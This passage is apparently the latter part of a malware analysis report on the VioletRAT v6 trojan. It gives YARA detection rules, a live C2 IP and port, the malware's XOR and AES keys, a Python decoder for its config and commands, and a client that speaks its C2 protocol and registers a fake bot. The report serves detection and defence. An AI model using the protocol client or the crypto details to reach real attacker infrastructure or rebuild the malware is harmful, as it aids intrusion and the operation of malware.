| `VioletRAT_v6_winrar_masquerade` | WinRAR version spoof + internal name `antimalwaver.exe` + Violet tag | High (this build style) |
| `VioletRAT_v6_command_protocol` | Plaintext `%command%` tokens + WMI AV-enumeration Base64 | Medium-High |
| `VioletRAT_v6_amsi_bypass` | `amsi.dll` / `AmsiScanBuffer` + `VirtualProtect` + Violet tag | Medium-High |

All four rules match the reference sample. The markers are matched with the `wide` modifier because .NET user strings live in the #US heap as UTF-16LE.

Fidelity notes:

- `VioletRAT_v6_strings` is the strongest family-level rule; it keys on the Base64-encoded family markers plus the VB.NET runtime dependency, making collisions with unrelated .NET malware unlikely.
- `VioletRAT_v6_winrar_masquerade` is high fidelity for this build style but will miss VioletRAT v6 builds that do not use the WinRAR version-resource spoof.
- `VioletRAT_v6_amsi_bypass` will match other .NET malware that uses the same `AmsiScanBuffer` ret-patch pattern. The `$violet` anchor (the `Violet v6` Base64 marker) is what ties it specifically to this family. For broader hunting, the condition can be relaxed to drop `$violet` at the cost of more noise.
- `VioletRAT_v6_command_protocol` targets the Base64-encoded `%command%` protocol tokens and the WMI AV-enumeration query; it may need tuning if the token format changes in a future builder version.

```text
import "pe"

rule VioletRAT_v6_strings
{
    meta:
        description = "VioletRAT v6 (VioletWorm) VB.NET stub - obfuscated string layer and family markers"
        author      = "taogoldi"
        version     = 1
        date        = "2026-06-25"
        hash        = "2bf04b9a583e6f1efa661a43d357bc8ea143bcb53fa87f81081347ee2feb80eb"
        tlp         = "TLP:CLEAR"
        family      = "VioletRAT"
    strings:
        $violet_tag = "PFZpb2xldD4=" wide      // "<Violet>"
        $violet_ver = "VmlvbGV0IHY2" wide      // "Violet v6"
        $aes_pw     = "WFNYU1hTWA==" wide      // "XSXSXSX"
        $xor_key    = "VEZpSUpyUA==" wide      // "TFiIJrP"
        $vb1 = "Microsoft.VisualBasic" ascii
        $clr = "_CorExeMain" ascii
    condition:
        uint16(0) == 0x5A4D and pe.number_of_sections >= 2 and
        $clr and $vb1 and
        2 of ($violet_tag, $violet_ver, $aes_pw, $xor_key)
}

rule VioletRAT_v6_winrar_masquerade
{
    meta:
        description = "VioletRAT v6 builds spoofing WinRAR 7.x with internal name antimalwaver.exe"
        author = "taogoldi"
        version = 1
        date = "2026-06-25"
        hash = "2bf04b9a583e6f1efa661a43d357bc8ea143bcb53fa87f81081347ee2feb80eb"
        tlp = "TLP:CLEAR"
        family = "VioletRAT"
    strings:
        $company  = "Alexander Roshal" wide
        $product  = "WinRAR" wide
        $internal = "antimalwaver.exe" wide
        $violet   = "VmlvbGV0IHY2" wide        // "Violet v6"
    condition:
        uint16(0) == 0x5A4D and
        $violet and 2 of ($company, $product, $internal)
}

rule VioletRAT_v6_command_protocol
{
    meta:
        description = "VioletRAT v6 C2 command tokens and WMI AV enumeration (Base64 literals, UTF-16LE)"
        author = "taogoldi"
        version = 1
        date = "2026-06-25"
        hash = "2bf04b9a583e6f1efa661a43d357bc8ea143bcb53fa87f81081347ee2feb80eb"
        tlp = "TLP:CLEAR"
        family = "VioletRAT"
    strings:
        $c1 = "JWNvbW1hbmRTZW5kRmlsZSU=" wide   // "%commandSendFile%"
        $c2 = "JWNvbW1hbmQ2NCU=" wide           // "%command64%"
        $c3 = "JWNvbW1hbmQ2NSU=" wide           // "%command65%"
        $c4 = "JWNvbW1hbmQ3MSU=" wide           // "%command71%"
        $w1 = "U2VsZWN0ICogZnJvbSBBbnRpdmlydXNQcm9kdWN0" wide  // "Select * from AntivirusProduct"
        $w2 = "XHJvb3RcU2VjdXJpdHlDZW50ZXIy" wide              // "\root\SecurityCenter2"
    condition:
        uint16(0) == 0x5A4D and
        (3 of ($c*) and 1 of ($w*))
}

rule VioletRAT_v6_amsi_bypass
{
    meta:
        description = "VioletRAT v6 in-memory AMSI bypass tied to the Violet plugin loader"
        author = "taogoldi"
        version = 1
        date = "2026-06-25"
        hash = "2bf04b9a583e6f1efa661a43d357bc8ea143bcb53fa87f81081347ee2feb80eb"
        tlp = "TLP:CLEAR"
        family = "VioletRAT"
    strings:
        $amsi   = "amsi.dll" wide
        $proc   = "AmsiScanBuffer" wide
        $vp     = "VirtualProtect" ascii
        $gpa    = "GetProcAddress" ascii
        $violet = "VmlvbGV0IHY2" wide        // "Violet v6"
    condition:
        uint16(0) == 0x5A4D and
        $amsi and $proc and $vp and $gpa and $violet
}
```

A Suricata companion rule is of limited value here: the C2 is raw TCP on a non-standard port with an AES-encrypted body, so there is no stable plaintext URI. Detection on the wire is best approached via IP/port reputation (`195.63.145[.]169:7000`) plus an ECB-block-repetition heuristic; a flow-based behavioral rule is possible but would need tuning to avoid false positives on other AES-over-raw-TCP traffic.

## Analysis Tooling

Two small Python scripts carried most of this analysis. Both are in the repo under `scripts/`.

### decoder.py

This is the workhorse. It re-implements VioletRAT's two crypto layers offline (the string layer is `Base64 + XOR("TFiIJrP")`, the packet layer is `AES-128-ECB` keyed by `MD5(password)`) and adds a helper that recovers dispatcher command names. It was used three ways: to decode the embedded config (recovering `195.63.145.169:7000`), to decode the approximately 110 encoded command constants into the command table, and as the engine behind the bulk dump in `reports/json/decoded_strings.json`. Run with no arguments it prints the config, AES key, and a sample of the command table; given a Base64 argument it decodes an arbitrary string-layer blob.

```python
#!/usr/bin/env python3
"""VioletRAT v6 string/config decoder.
Layer 1 (config + UI strings): Base64 -> XOR (repeating key 'TFiIJrP') -> UTF-8.
   matches method UWiacKqtEeAk8xm0l9y6() in the obfuscated assembly.
Layer 2 (C2 packet body): AES-128 ECB, key = MD5(password), default password 'XSXSXSX'.
Usage: decoder.py            # decode known config blobs
       decoder.py <b64str>   # decode an arbitrary layer-1 blob
"""
import base64, sys, hashlib

XOR_KEY = b"TFiIJrP"   # base64 'VEZpSUpyUA=='

def layer1(b64s: str) -> str:
    raw = base64.b64decode(b64s)
    return bytes(c ^ XOR_KEY[i % len(XOR_KEY)] for i, c in enumerate(raw)).decode('utf-8', 'replace')

def decode_command(literal: str) -> str:
    """Recover a dispatcher command name from the source FromBase64String literal.
    Each branch compares EncodeString(received_cmd) == constant, where
    constant = b64decode(literal) and EncodeString = Base64(XOR(cmd)).
    So: cmd = XOR(b64decode(constant)). Plaintext '%command%' tokens pass through."""
    constant = base64.b64decode(literal).decode('latin-1')
    if '%' in constant:
        return constant
    raw = base64.b64decode(constant)
    return bytes(c ^ XOR_KEY[i % len(XOR_KEY)] for i, c in enumerate(raw)).decode('latin-1')

def aes_key(password: str = "XSXSXSX") -> bytes:
    return hashlib.md5(password.encode('utf-8')).digest()

# dispatcher literals (as they appear in the assembly) and the embedded config globals
COMMAND_CONSTANTS = ["SmlNSw==", "RndvbUdnOD0=", "SVNnQUp6a0dNVGdx",
                     "TXlNZElDUVVQdz09", "Rnk4Rk9Ub1hJZz09", "SEJBbkNnPT0=", "RUFJR09oaz0="]
CONFIG = {"C2_host": "Wlg5Y1ozeEJmbVZ5WEdkN1JHaz0=", "C2_port": "WTNaWmVRPT0="}

if __name__ == "__main__":
    if len(sys.argv) > 1:
        for a in sys.argv[1:]:
            print(f"{a}  ->  {layer1(a)!r}")
        sys.exit(0)
    print("== embedded config ==")
    for name, blob in CONFIG.items():
        inner = base64.b64decode(blob).decode('utf-8', 'replace')   # global = base64(layer-1 blob)
        print(f"  {name}: {layer1(inner)!r}")
    print(f"  AES key (pw 'XSXSXSX') = MD5 = {aes_key().hex()}")
    print("== sample commands ==")
    for c in COMMAND_CONSTANTS:
        print(f"  {c:18} -> {decode_command(c)!r}")
```

Output:

```
== embedded config ==
  C2_host: '195.63.145.169'
  C2_port: '7000'
  AES key (pw 'XSXSXSX') = MD5 = 679bcea2b6c93957139ca6893dbd7ece
== sample commands ==
  SmlNSw==           -> 'rec'
  RndvbUdnOD0=       -> 'CLOSE'
  SVNnQUp6a0dNVGdx   -> 'uninstall'
  TXlNZElDUVVQdz09   -> 'getinfo'
  Rnk4Rk9Ub1hJZz09   -> 'Cilpper'
  SEJBbkNnPT0=       -> 'HVNC'
  RUFJR09oaz0=       -> 'DDosS'
```

### c2_capture.py

The second script speaks the C2 protocol, to validate the reversing and to try to capture an operator-pushed plugin. It is deliberately capture-only: it registers a fake bot, answers keepalives to stay connected, and saves every received frame, but it never executes a command, starts a process, or loads a pushed assembly. It also refuses to connect unless egress leaves through a configured proxy (a one-off `ALLOW_DIRECT=1` override was used for the single explicitly-authorized direct attempt). The protocol core is small, and it is the practical proof that the framing and crypto above are correct:

```python
from Crypto.Cipher import AES
import hashlib, socket

KEY = hashlib.md5(b"XSXSXSX").digest()          # default session key
SEP = "<Violet>"

def enc(msg):                                   # AES-128-ECB + PKCS7
    d = msg.encode(); pad = 16 - (len(d) % 16)
    return AES.new(KEY, AES.MODE_ECB).encrypt(d + bytes([pad]) * pad)

def dec(ct):
    pt = AES.new(KEY, AES.MODE_ECB).decrypt(ct)
    return pt[:-pt[-1]] if pt and 1 <= pt[-1] <= 16 else pt

def frame(msg):                                 # <ascii-len>\x00<ciphertext>
    ct = enc(msg)
    return str(len(ct)).encode() + b"\x00" + ct

def recv_frame(sock):                           # mirror of the bot's byte-at-a-time parser
    lenbuf = b""
    while True:
        b = sock.recv(1)
        if b in (b"", b"\x00"):
            break
        lenbuf += b
    n = int(lenbuf or 0)
    ct = b""
    while n and len(ct) < n:
        ct += sock.recv(n - len(ct))
    return n, ct

# registration: INFO<Violet>HWID<Violet>user<Violet>OS<Violet>Violet v6<Violet>...<Violet>group-id
reg = SEP.join(["INFO", hashlib.md5(b"lab").hexdigest(), "Admin",
                "Windows 10 Pro SP 64bit", "Violet v6", "25/06/2026", "25/06/2026",
                "Program Manager", "Windows Defender", "WindowsAntimalware", "Nothing",
                "8e25f5bc7b744fc16b148c096d44e87fbfab1dd94e7952be07defec8413a486c"])
# s.sendall(frame(reg)); then loop recv_frame(s) -> dec(ct).split(SEP)  [capture only, never execute]
```

This client connected to the live C2, and the server's behavior suggested the registration frame was syntactically acceptable before resetting the session, as described in the live-probe section. The full version, with the proxy pre-flight and safety guards, is `scripts/c2_capture.py`.

## Conclusion

VioletRAT v6 is a competent, unoriginal commodity RAT. Nothing is novel in the cryptography (Base64 + XOR for strings, AES-128-ECB keyed by an MD5 of a default password for packets) or in the delivery (WinRAR version spoof, `svchost.exe` drop, `Run` key plus scheduled tasks). What makes it worth documenting is breadth: a single 70 KB VB.NET stub exposes 110 command branches spanning surveillance, theft, DDoS, ransomware, and worm spread, and extends itself at runtime with C2-pushed .NET plugins loaded after an in-memory AMSI bypass.

For defenders the weak points are concrete. The ECB mode and default `XSXSXSX` password make sessions that never rotate the key decryptable offline with a single MD5 computation. The static XOR key `TFiIJrP` recovers the entire config without running the sample. The `<Violet>` separator, the `Cilpper` typo, the `WindowsDefender` Run value, and the mutex `vzOrETV8nZcIYnJA` are durable anchors that outlast the C2 IP. The WinRAR-versus-`antimalwaver.exe` inconsistency stands out under any version-info review. The single hard-coded C2 means one block silences the implant, though the IP is short-lived; the YARA rules key on family-level string markers and should survive the builder's renamer across future v6 builds.

What this analysis does not claim: the sample is not AsyncRAT -- the machine classifier label was disproven on evidence. This is not a novel family. The grabber targeting lives in operator-pushed plugins that the stub never carried, so no browser or wallet target list can be derived from this file alone; any inventory of plugin capabilities would require capturing live tasking, which did not happen here.

## References / Sources

Most technical findings in this post come from static reversing of the sample itself; the sources below were used for family/context validation and external provenance.

- derp.ca, "VioletWorm v4.7 (Violet RAT): The Most Dangerous Payload in a 9-RAT Toolkit" (public analysis of the prior major version).
- Hatching Triage reports `260620-31ea5sbt5w` and `260621-aa84lsav2j` (generic behavioral tags only).
- Vendor/forum listings for VioletRAT (violetrat[.]net, violetsoftware[.]net) corroborating the capability set and builder model.

---

*taogoldi -- TLP:CLEAR -- 2026-06-25*
